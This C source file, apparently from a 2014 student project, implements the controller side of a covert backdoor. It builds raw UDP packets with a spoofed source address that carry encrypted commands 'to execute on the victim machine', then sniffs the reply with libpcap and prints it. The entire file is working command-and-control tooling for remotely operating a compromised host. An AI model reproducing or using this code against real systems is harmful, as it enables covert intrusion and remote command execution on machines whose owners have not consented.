#include "client.h"

/*--------------------------------------------------------------------------------------------------------------
--	FUNCTION:	    send_packet
--
--	INTERFACE:	    void send_packet(struct AddrInfo *UserAddr)
--
--				    AddrInfo *UserAddr - a AdderInfo struct contain the source port and IP, destination port and
--                      IP, command to execute.
--
--	RETURNS:
--
--	LAST MODIFIED:  October 6, 2014
--
--	DESIGNERS:	    Slade Solobay & Zach Smoroden
--
--	PROGRAMMERS:	Slade Solobay & Zach Smoroden
--
--	NOTES:
--	Sends a raw UDP packet towards a backdoor. Contain a command to execute on the victim machine.
--
--------------------------------------------------------------------------------------------------------------*/
void send_packet(struct AddrInfo *UserAddr)
{
    char datagram[PKT_SIZE], *data; 	// set the Datagram (packet) size
    struct iphdr *iph = (struct iphdr *) datagram;	 //IP header
    struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));	//UDP header
    struct sockaddr_in sin;
    pseudo_header psh;

    sin.sin_family = AF_INET;
    sin.sin_port = htons (UserAddr->dport);
    sin.sin_addr.s_addr = inet_addr (UserAddr->DstHost);

    memset (datagram, 0, PKT_SIZE); // zero out the buffer where the datagram will be stored

    //Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
    strcpy(data , encrypt(ENCRYPTION_KEY, UserAddr->cmd));

    //IP Header Fields
    iph->ihl = 5;		// IP Header Length
    iph->version = 4;		// Version 4
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct udphdr) + strlen(data);	// Calculate the total Datagram size
    iph->id = htonl (DEFAULT_IP_ID); 	//IP Identification Field
    iph->frag_off = 0;
    iph->ttl = DEFAULT_TTL;		// Set the TTL value
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;      	//Initialize to zero before calculating checksum
    iph->saddr = inet_addr (UserAddr->SrcHost);  //Source IP address
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

    //UDP Header Fields
    udph->source = htons (UserAddr->sport); // UDP source port
    udph->dest = htons (UserAddr->dport);	// UDP destination port
    udph->len = htons(8 + strlen(UserAddr->cmd)); //UDP header size plus data (command)
    udph->check = 0;			// Initialize the checksum to zero

    // calcluate the IP checksum
    psh.source_address = inet_addr(UserAddr->SrcHost);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + strlen(data));

    memcpy(&psh.udp , udph , sizeof (struct udphdr));

    udph->check = csum( (unsigned short*) &psh , sizeof (pseudo_header));

    //IP_HDRINCL to stop the kernel from building the packet headers
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt (UserAddr->RawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
            perror ("setsockopt");
    }
    //Send the packet
    if (sendto (UserAddr->RawSocket, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
    {
    	perror ("sendto");
    	exit(1);
    }
    else
    {
        printf("\nPacket Sent! Listening for responses....\n");
    }
}

/*--------------------------------------------------------------------------------------------------------------
--	FUNCTION:	    receive_packet
--
--	INTERFACE:	    void receive_packet(PcapInfo *pcap_arg)
--
--				    PcapInfo *pcap_arg - a PcapInfo struct contain the descriptor to the active NIC,
--                      address/subnet mask and packet Filter string to be compiled into the NIC
--
--	RETURNS:
--
--	LAST MODIFIED:  October 6, 2014
--
--	DESIGNERS:	    Slade Solobay & Zach Smoroden
--
--	PROGRAMMERS:	Slade Solobay & Zach Smoroden
--
--	NOTES:
--	Listens for packets using the libpcap library. Captures packets based on FILTER in client.h. Calls
--  pkt_callback for each packet captured.
--
--------------------------------------------------------------------------------------------------------------*/
void receive_packet(PcapInfo *pcap_arg)
{
    struct bpf_program fp;      // holds the compiled program

    PcapInfo *pcap_ptr = (PcapInfo *)pcap_arg;

    if(pcap_compile (pcap_ptr->nic_descr, &fp, pcap_ptr->cmd, 0, pcap_ptr->netp) == -1)
    {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter(pcap_ptr->nic_descr, &fp) == -1)
    {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }

    // Start the capture session
    pcap_loop (pcap_ptr->nic_descr, -1, pkt_callback, (u_char *)pcap_ptr->nic_descr);

}

/*--------------------------------------------------------------------------------------------------------------
--	FUNCTION:	    pkt_callback
--
--	INTERFACE:	    void pkt_callback (u_char *descr, const struct pcap_pkthdr* pkthdr, const u_char* packet)
--
--				    u_char *descr - the nic descriptor used for breaking the pcap_loop
--                  const struct pcap_pkthdr* pkthdr - struct pcap_pkthdr pointer pointing to the packet time stamp
--                    and lengths
--                  const u_char* packet - pointer to the first caplen (as given in the struct pcap_pkthdr a pointer,
--                    which is passed to the callback routine) bytes of data from the packet.
--	RETURNS:
--
--	LAST MODIFIED:  October 6, 2014
--
--	DESIGNERS:	    Slade Solobay & Zach Smoroden
--
--	PROGRAMMERS:	Slade Solobay & Zach Smoroden
--
--	NOTES:
--	Callback function for pcap_loop. Prints data of first packet received and breaks.
--
--------------------------------------------------------------------------------------------------------------*/
void pkt_callback (u_char *descr, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
	static int count = 1;
	int len, i;
	struct ethhdr *ethernet_header;
	struct iphdr *ip_header;

	fprintf(stdout,"\nData received... %d\n", count);
	fflush(stdout);
    	count++;

	// Ensure that there are enough bytes to make up the complete set of headers

	if ((len = (sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr))) > 40)
	{
		/* Do all the checks: 1. Is it an IP pkt ? 2. is it UDP ? */

		ethernet_header = (struct ethhdr *)packet;

		if(ntohs(ethernet_header->h_proto) == ETH_P_IP)
		{
			ip_header = (struct iphdr *)(packet + sizeof(struct ethhdr));

			if(ip_header->protocol == IPPROTO_UDP)
			{
                printf("Printing to file.");
                for(i = len; i < pkthdr->len; i++) {
                    if(isprint(packet[i]))                /* Check if the packet data is printable */
                        printf("%c ",packet[i]);          /* Print it */
                    else
                        printf(".");                      /* If not print a . */
                    if((i % 16 == 0 && i != 0) || i == pkthdr->len-1)
                        printf("\n");
                }
			}
			else
			{
				printf("Not a UDP packet\n");
			}
		}
		else
		{
			printf("Not an IP packet\n");
		}
	}
	else
	{
		printf("UDP Header not present \n");
	}
	pcap_breakloop((pcap_t *)descr);
}